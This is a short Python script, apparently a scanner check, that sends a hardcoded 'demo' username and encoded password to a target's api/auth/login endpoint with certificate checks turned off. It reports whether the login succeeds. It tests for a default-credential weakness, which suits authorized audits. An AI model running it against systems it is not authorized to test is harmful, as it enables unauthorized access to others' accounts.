import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomInt(s,e):
	import random
	key=random.randint(int(s),int(e))
	return key
randNum=randomInt(1000, 9999)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"api/auth/login"
	body='{"username":"demo","password":"cjab9Eu0dkS5Veh/sqghbg33Qa/xnqBolObRpJLqeDetgR8quuGlCuvUWjq0sFtle9HYgC1ztMFUFd/rnp11Ug==","loginType":0}'
	headers={'Content-Type': 'application/json'}
	response=requests.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "success" in response.text and "true" in response.text and 'Authorization' in str(response.headers):
		r0=True
	else:
		r0=False
	
	if r0:
		return True
	else:
		return False
